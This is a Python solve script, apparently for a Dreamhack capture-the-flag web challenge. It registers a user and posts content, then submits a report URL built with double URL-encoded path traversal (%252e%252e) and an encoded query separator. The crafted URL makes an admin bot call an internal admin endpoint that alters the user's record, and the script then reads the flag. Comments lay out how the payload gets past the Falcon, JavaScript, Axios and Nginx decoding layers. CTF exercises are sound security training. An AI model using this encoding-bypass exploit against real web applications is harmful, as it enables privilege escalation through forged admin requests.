import requests
import time
import random
import string
import logging
import http.client

# 로그 설정
http.client.HTTPConnection.debuglevel = 1
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.setLevel(logging.DEBUG)
requests_log.propagate = True

TARGET_URL = "http://host3.dreamhack.games:17439" 
API_URL = f"{TARGET_URL}/api"

username = "winner_" + "".join(random.choices(string.ascii_lowercase, k=4))
password = "password123"

def solve():
    s = requests.Session()

    print(f"\n=== 1. 유저 생성 ({username}) ===")
    s.post(f"{API_URL}/user/signup", json={"username": username, "password": password, "occupation": "student"})
    res = s.post(f"{API_URL}/user/token", json={"username": username, "password": password})
    if res.status_code != 200: return
    token = res.json()['msg']['token']
    headers = {"Authorization": f"JWT {token}"}

    print(f"\n=== 2. 게시글 작성 ===")
    s.post(f"{API_URL}/post/write", json={"title": "win", "content": "win"}, headers=headers)
    posts = s.get(f"{API_URL}/post/list", headers=headers).json()['msg']
    valid_id = posts[-1]['id']

    # =================================================================
    # [FINAL LOGIC] Falcon No-Decode Hypothesis
    # 1. Dots: %252e%252e (2중)
    #    -> Falcon(유지) -> Bot(%252e%252e) -> JS Decode(%2e%2e) -> 검증 통과 
    #    -> Axios(%2e%2e) -> Nginx(..) -> 이동 성공
    # 2. Separator: %3F (1중)
    #    -> Falcon(유지) -> Bot(%3F) -> JS Split 통과 -> JS Decode(?) 
    #    -> Axios(?) -> 쿼리 파라미터 인식 성공
    # =================================================================
    
    # occupation 값 설정
    # 앞에 슬래시(/)를 넣어 경로 병합 문제 예방
    occupation_val = "/%252e%252e/set/2%3Fusername=" + username
    
    # 전체 URL: occupation 앞의 ?도 1중 인코딩(%3F)
    payload = f"{valid_id}/../../admin%3Foccupation={occupation_val}"
    
    attack_url = f"{API_URL}/post/report?id={payload}"
    
    print(f"[INTENT] {attack_url}")

    # PreparedRequest로 전송 (URL 변조 방지)
    req = requests.Request('GET', attack_url, headers=headers)
    prepped = s.prepare_request(req)
    prepped.url = attack_url 
    
    s.send(prepped)
    
    print("[WAIT] 봇 방문 대기 (20s)...")
    for i in range(20):
        time.sleep(1)
        print(".", end="", flush=True)
    print()

    print("[CHECK] Flag 확인")
    res = s.get(f"{API_URL}/post/read", params={"id": "1"}, headers=headers)
    print(res.text)

if __name__ == "__main__":
    solve()